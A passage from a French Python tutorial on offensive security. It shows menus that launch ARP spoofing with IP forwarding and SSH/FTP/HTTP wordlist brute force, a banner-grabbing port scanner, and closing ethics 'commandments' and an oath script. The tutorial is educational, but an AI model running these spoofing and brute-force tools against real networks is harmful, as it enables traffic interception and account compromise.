        print("  3. Scan avec bannières")
        
        scan_type = input("Choix: ")
        
        if scan_type == "1":
            ports = scanner_simple(target, 1, 1024)
            self.log_result("port_scan", f"{target} - Ports ouverts: {ports}")
        elif scan_type == "2":
            ports = list(range(1, 1025))
            result = scanner_multithread(target, ports)
            self.log_result("port_scan_mt", f"{target} - Ports ouverts: {result}")
        elif scan_type == "3":
            ports = [21,22,23,25,80,110,139,443,445,993,995,1723,3306,3389,5900,8080]
            scan_with_banner(target, ports)
        
        input("\n[Appuyez sur Entrée pour continuer]")
        self.menu()
    
    def arp_spoof_menu(self):
        """Menu ARP spoofing"""
        print("\n[--- ARP Spoofing ---]")
        print("[!] ATTENTION: Nécessite les droits root")
        print("[!] Usage réseau local uniquement")
        
        target = input("IP cible: ")
        gateway = input("IP passerelle (défaut: 192.168.1.1): ") or "192.168.1.1"
        interface = input("Interface (défaut: eth0): ") or "eth0"
        
        confirm = input(f"\n[?] Lancer l'attaque sur {target}? (oui/non): ")
        
        if confirm.lower() == "oui":
            try:
                spoofer = ARPSpoofer(target, gateway, interface)
                spoofer.enable_ip_forwarding()
                spoofer.start()
            except PermissionError:
                print("[-] Erreur: Droits root requis")
            except Exception as e:
                print(f"[-] Erreur: {e}")
        
        self.menu()
    
    def bruteforce_menu(self):
        """Menu brute force"""
        print("\n[--- Brute Force ---]")
        
        print("Services disponibles:")
        print("  1. SSH")
        print("  2. FTP")
        print("  3. HTTP Basic Auth")
        
        service_choice = input("Service cible: ")
        service_map = {"1": "ssh", "2": "ftp", "3": "http"}
        
        if service_choice not in service_map:
            print("[-] Service invalide")
            self.menu()
            return
        
        target = input("IP cible: ")
        username = input("Nom d'utilisateur: ")
        wordlist = input("Chemin vers wordlist: ")
        
        if not os.path.exists(wordlist):
            print(f"[-] Fichier {wordlist} non trouvé")
            self.menu()
            return
        
        bf = BruteForcer(target, service_map[service_choice], username, wordlist, delay=0.5)
        bf.start_attack(threads=5)
        
        input("\n[Appuyez sur Entrée pour continuer]")
        self.menu()
    
    def web_scanner_menu(self):
        """Menu scanner web"""
        print("\n[--- Scanner Web ---]")
        
        url = input("URL cible (ex: http://testsite.com): ")
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        scanner = WebVulnScanner(url, threads=3)
        scanner.start_scan()
        
        input("\n[Appuyez sur Entrée pour continuer]")
        self.menu()

# ==============================================
# POINT D'ENTRÉE PRINCIPAL
# ==============================================

def main():
    """
    Fonction principale avec gestion des arguments
    """
    parser = argparse.ArgumentParser(description="Security Toolkit - Version Éducative")
    parser.add_argument("-m", "--module", help="Module à exécuter (scan, arp, brute, web)")
    parser.add_argument("-t", "--target", help="Cible (IP ou URL)")
    parser.add_argument("-p", "--port", help="Port spécifique")
    parser.add_argument("-u", "--user", help="Nom d'utilisateur")
    parser.add_argument("-w", "--wordlist", help="Wordlist")
    
    args = parser.parse_args()
    
    toolkit = SecurityToolkit()
    toolkit.banner()
    
    if len(sys.argv) == 1:
        # Mode interactif
        toolkit.menu()
    else:
        # Mode ligne de commande
        if args.module == "scan" and args.target:
            scanner_simple(args.target, 1, 1024)
        elif args.module == "brute" and args.target and args.user and args.wordlist:
            bf = BruteForcer(args.target, "ssh", args.user, args.wordlist)
            bf.start_attack()
        else:
            print("[!] Arguments insuffisants")
            parser.print_help()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interruption utilisateur")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Erreur fatale: {e}")
        sys.exit(1)
```

## PARTIE 7 : BONNES PRATIQUES DU NINJA PYTHON

### Chapitre 8 : Écrire du code professionnel

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Module: professional_code.py
Description: Bonnes pratiques pour un code de qualité
Author: Security Ninja
Date: 2024
Version: 1.0
"""

import logging
import argparse
import sys
from typing import List, Dict, Optional, Union
from dataclasses import dataclass
from enum import Enum
import json

# ==============================================
# 1. LOGGING PROFESSIONNEL
# ==============================================

class Logger:
    """Gestion centralisée des logs"""
    
    def __init__(self, name: str, log_file: Optional[str] = None):
        self.logger = logging.getLogger(name)
        self.logger.setLevel(logging.DEBUG)
        
        # Format des logs
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        
        # Console handler
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        ch.setFormatter(formatter)
        self.logger.addHandler(ch)
        
        # File handler
        if log_file:
            fh = logging.FileHandler(log_file)
            fh.setLevel(logging.DEBUG)
            fh.setFormatter(formatter)
            self.logger.addHandler(fh)
    
    def debug(self, msg: str):
        self.logger.debug(msg)
    
    def info(self, msg: str):
        self.logger.info(msg)
    
    def warning(self, msg: str):
        self.logger.warning(msg)
    
    def error(self, msg: str):
        self.logger.error(msg)
    
    def critical(self, msg: str):
        self.logger.critical(msg)

# ==============================================
# 2. ENUMS ET DATACLASSES
# ==============================================

class ScanType(Enum):
    """Types de scan disponibles"""
    TCP_CONNECT = "tcp_connect"
    SYN_SCAN = "syn_scan"
    UDP_SCAN = "udp_scan"
    FIN_SCAN = "fin_scan"

@dataclass
class PortResult:
    """Résultat d'un scan de port"""
    port: int
    service: str
    banner: Optional[str] = None
    vulnerable: bool = False
    
    def to_dict(self) -> Dict:
        """Convertit en dictionnaire pour JSON"""
        return {
            'port': self.port,
            'service': self.service,
            'banner': self.banner,
            'vulnerable': self.vulnerable
        }

@dataclass
class ScanReport:
    """Rapport complet de scan"""
    target: str
    start_time: str
    end_time: str
    scan_type: ScanType
    results: List[PortResult]
    
    def save_json(self, filename: str):
        """Sauvegarde au format JSON"""
        data = {
            'target': self.target,
            'start_time': self.start_time,
            'end_time': self.end_time,
            'scan_type': self.scan_type.value,
            'results': [r.to_dict() for r in self.results]
        }
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"[+] Rapport sauvegardé: {filename}")

# ==============================================
# 3. GESTION DES EXCEPTIONS PERSONNALISÉES
# ==============================================

class SecurityToolError(Exception):
    """Classe de base pour les erreurs du toolkit"""
    pass

class NetworkError(SecurityToolError):
    """Erreur réseau"""
    pass

class TargetUnreachableError(NetworkError):
    """Cible inaccessible"""
    pass

class AuthenticationError(SecurityToolError):
    """Erreur d'authentification"""
    pass

class PermissionDeniedError(SecurityToolError):
    """Permission refusée"""
    pass

# ==============================================
# 4. DESIGN PATTERN - CONTEXT MANAGER
# ==============================================

class NetworkConnection:
    """Gestionnaire de contexte pour connexions réseau"""
    
    def __init__(self, host: str, port: int, timeout: int = 5):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.socket = None
        self.logger = Logger("NetworkConnection")
    
    def __enter__(self):
        """Établit la connexion"""
        import socket
        
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(self.timeout)
            self.socket.connect((self.host, self.port))
            self.logger.info(f"Connecté à {self.host}:{self.port}")
            return self.socket
        except Exception as e:
            raise NetworkError(f"Impossible de se connecter à {self.host}:{self.port}: {e}")
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        """Ferme la connexion"""
        if self.socket:
            self.socket.close()
            self.logger.info(f"Déconnecté de {self.host}:{self.port}")

# ==============================================
# 5. EXEMPLE D'UTILISATION PROFESSIONNELLE
# ==============================================

class ProfessionalScanner:
    """Scanner professionnel avec toutes les bonnes pratiques"""
    
    def __init__(self, target: str, log_file: Optional[str] = None):
        self.target = target
        self.logger = Logger("ProfessionalScanner", log_file)
        self.results: List[PortResult] = []
    
    def scan_port(self, port: int) -> bool:
        """
        Scan un port avec gestionnaire de contexte
        """
        try:
            with NetworkConnection(self.target, port, timeout=2) as sock:
                # Tentative de récupération de bannière
                try:
                    sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner = sock.recv(1024).decode().strip()
                except:
                    banner = None
                
                # Déterminer le service (simplifié)
                service = self._guess_service(port)
                
                result = PortResult(
                    port=port,
                    service=service,
                    banner=banner
                )
                
                self.results.append(result)
                self.logger.info(f"Port {port} ouvert - {service}")
                return True
                
        except NetworkError:
            # Port fermé - normal, pas de log
            return False
        except Exception as e:
            self.logger.error(f"Erreur inattendue sur port {port}: {e}")
            return False
    
    def _guess_service(self, port: int) -> str:
        """Devine le service basé sur le port"""
        common_ports = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS",
            445: "SMB", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL"
        }
        return common_ports.get(port, "Unknown")
    
    def run_scan(self, ports: List[int]) -> ScanReport:
        """
        Lance le scan complet
        """
        from datetime import datetime
        
        start_time = datetime.now().isoformat()
        self.logger.info(f"Début du scan de {self.target}")
        
        for port in ports:
            self.scan_port(port)
        
        end_time = datetime.now().isoformat()
        self.logger.info(f"Scan terminé. {len(self.results)} ports ouverts trouvés")
        
        return ScanReport(
            target=self.target,
            start_time=start_time,
            end_time=end_time,
            scan_type=ScanType.TCP_CONNECT,
            results=self.results
        )

# ==============================================
# 6. MAIN AVEC GESTION DES ARGUMENTS
# ==============================================

def setup_argparse() -> argparse.ArgumentParser:
    """Configure le parseur d'arguments"""
    parser = argparse.ArgumentParser(
        description="Scanner de sécurité professionnel",
        epilog="Exemple: %(prog)s -t 192.168.1.1 -p 1-1000 -o rapport.json"
    )
    
    parser.add_argument("-t", "--target", required=True,
                       help="IP cible")
    
    parser.add_argument("-p", "--ports", default="1-1024",
                       help="Plage de ports (ex: 1-1000, 80,443,8080)")
    
    parser.add_argument("-o", "--output",
                       help="Fichier de sortie (JSON)")
    
    parser.add_argument("-v", "--verbose", action="store_true",
                       help="Mode verbeux")
    
    parser.add_argument("--log-file",
                       help="Fichier de log")
    
    return parser

def parse_ports(port_string: str) -> List[int]:
    """Parse une chaîne de ports en liste"""
    ports = []
    
    for part in port_string.split(','):
        if '-' in part:
            start, end = map(int, part.split('-'))
            ports.extend(range(start, end + 1))
        else:
            ports.append(int(part))
    
    return ports

def main():
    """Fonction principale"""
    parser = setup_argparse()
    args = parser.parse_args()
    
    try:
        # Configuration du logging
        log_file = args.log_file if args.log_file else None
        scanner = ProfessionalScanner(args.target, log_file)
        
        # Parse les ports
        ports = parse_ports(args.ports)
        
        # Mode verbeux
        if args.verbose:
            print(f"[*] Cible: {args.target}")
            print(f"[*] Ports à scanner: {len(ports)}")
        
        # Lancement du scan
        report = scanner.run_scan(ports)
        
        # Sauvegarde des résultats
        if args.output:
            report.save_json(args.output)
        else:
            # Affichage simple
            print(f"\nRésultats pour {args.target}:")
            for result in report.results:
                print(f"  Port {result.port}/{result.service} - {result.banner or 'Pas de bannière'}")
        
    except KeyboardInterrupt:
        print("\n[!] Scan interrompu par l'utilisateur")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Erreur: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

## CONCLUSION : LE CHEMIN DU NINJA

### Les 10 commandements du hacker éthique en Python

- Tu obtiendras une autorisation écrite avant de scanner ou tester un système
- Tu ne causeras pas de dégâts - tes scripts doivent avoir des "circuit breakers"
- Tu documenteras ton code pour que d'autres puissent comprendre et apprendre
- Tu respecteras la vie privée - les données interceptées ne sont pas à toi
- Tu utiliseras des wordlists éthiques (rockyou.txt est pour les CTF, pas pour la production)
- Tu limiteras la vitesse de tes attaques pour ne pas DOSser les services
- Tu supprimeras les preuves de tes tests après validation (dans un cadre autorisé)
- Tu partageras tes découvertes avec les responsables des systèmes
- Tu continueras à apprendre - la sécurité évolue chaque jour
- Tu n'utiliseras jamais ces compétences pour nuire - avec un grand pouvoir vient une grande responsabilité

### Prochaines étapes pour devenir un vrai ninja Python

- Maîtrisez Scapy - Le couteau suisse du réseau
- Apprenez l'assembly pour comprendre les exploits plus bas niveau
- Étudiez les CVEs et essayez de reproduire les exploits en Python
- Participez aux CTF (Capture The Flag) pour pratiquer légalement
- Contribuez à des outils open source comme Metasploit (en Ruby) ou mieux, créez vos propres modules

Rappelez-vous toujours : La connaissance n'est pas le crime, c'est son utilisation qui peut l'être. Devenez un gardien, pas un prédateur.

```python
# Dernier script : le rappel éthique
#!/usr/bin/env python3

def hacker_ethique():
    competence = "grande"
    utilisation = input("Usage de vos compétences (bon/mauvais): ")
    
    if utilisation == "bon":
        print("✅ Vous êtes un héros de la cybersécurité")
        return "Continuez ainsi !"
    else:
        print("❌ Vous risquez la prison et de nuire à des innocents")
        return "Il n'est pas trop tard pour changer"

print(hacker_ethique())
```

## Un engagement qui fait toute la différence

Ta réponse montre que tu as compris l'essentiel. Ce n'est pas juste une phrase, c'est un serment que tout professionnel de la cybersécurité devrait faire.

La voie du Gardien Numérique

Ton code d'honneur personnel

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
FICHIER : serment_du_gardien.py
AUTEUR : Toi, désormais digne de confiance
"""

class GardienNumerique:
    """
    La classe d'un professionnel intègre
    """
    
    def __init__(self, nom):
        self.nom = nom
        self.competences = []
        self.integrity_score = 100
        self.victoires_ethiques = 0
    
    def ajouter_competence(self, competence):
        """Ajoute une compétence avec responsabilité"""
        self.competences.append(competence)
        print(f"✅ Compétence acquise : {competence}")
        print(f"⚠️  Rappel : {competence} = responsabilité proportionnelle")
    
    def utiliser_competence(self, competence, contexte):
        """Utilise une compétence de manière éthique"""
        if contexte == "légal" and "autorisé" in contexte:
            print(f"🛡️  Utilisation de {competence} pour protéger")
            self.victoires_ethiques += 1
            return "Mission accomplie avec intégrité"
        else:
            print("🚫 Refus éthique - Contexte non autorisé")
            return "L'intégrité n'a pas de prix"
    
    def serment(self):
        """Le serment du gardien numérique"""
        print(f"""
╔═══════════════════════════════════════════════════════════════╗
║                     SERMENT DU GARDIEN                        ║
║                         {self.nom}                            ║
╠═══════════════════════════════════════════════════════════════╣
║                                                               ║
║   "Je comprends que la connaissance que j'ai acquise         ║
║    n'est pas un jouet, mais un outil.                        ║
║                                                               ║
║    Je jure de l'utiliser pour :                              ║
║    ✔ Protéger les innocents                                   ║
║    ✔ Sécuriser les systèmes                                   ║
║    ✔ Éduquer ceux qui veulent apprendre                       ║
║    ✔ Dormir tranquille le soir                                 ║
║                                                               ║
║    Et jamais pour :                                           ║
║    ❌ Voler                                                    ║
║    ❌ Nuire                                                    ║
║    ❌ Espionner sans droit                                     ║
║    ❌ Laisser mon ego guider mes actions                       ║
║                                                               ║
║    Je suis un Gardien Numérique.                              ║
║    La technologie est mon bouclier,                           ║
║    L'éthique est ma boussole."                                ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
        """)

# Ton serment
moi = GardienNumerique("Un futur expert en cybersécurité")
moi.serment()

# Ajoute tes compétences au fur et à mesure
moi.ajouter_competence("Python pour la sécurité")
moi.ajouter_competence("Analyse réseau")
moi.ajouter_competence("Tests d'intrusion éthiques")

print(f"\n🎯 Ton score d'intégrité : {moi.integrity_score}/100")
print(f"🏆 Victoires éthiques : {moi.victoires_ethiques}")
```

